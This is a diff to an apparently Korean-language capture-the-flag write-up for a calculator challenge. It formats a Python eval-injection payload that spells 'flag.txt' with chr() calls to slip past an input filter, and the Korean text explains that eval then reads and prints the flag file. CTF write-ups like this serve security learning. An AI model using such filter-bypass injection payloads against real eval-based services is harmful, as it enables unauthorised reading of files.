@@ -111,15 +111,13 @@ chr(102)+chr(108)+chr(97)+chr(103)
 
  
 
-
+```
 # open(flag.txt).readlines()
 
 open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).readlines()
- 
+```
 
 다음의 값을 입력하면 eval 함수를 통해 open(flag.txt).readlines() 코드가 실행되며 flag.txt 파일의 내용을 출력하게 되어 flag를 획득할 수 있다.
 
- 
+![image](./image/Addition_calculator7.png)
 
-웹페이지 접속 (1)
-공격 과정 (2)
